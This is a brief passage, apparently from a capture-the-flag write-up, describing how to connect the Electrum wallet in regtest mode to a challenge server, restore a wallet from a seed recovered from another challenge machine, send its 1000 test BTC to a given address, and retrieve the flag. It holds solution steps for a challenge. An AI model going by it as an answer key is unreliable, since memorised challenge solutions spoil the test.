Now, let's run electrum (use it how it is mentioned in the the message from the `nc` version; just with a small caveat, the port is not `50002`, but it is the port of that third instance, the one we haven't used) => electrum --regtest --oneserver -s IPADDR:PORT:t

Select "I have a seed" when prompted and insert the seed from the `ssh` machine.

Upon opening, we'll see a balance of 1000 `BTC`. Send all of that to the provided `BTC` address, then use the `nc` instance to get the flag.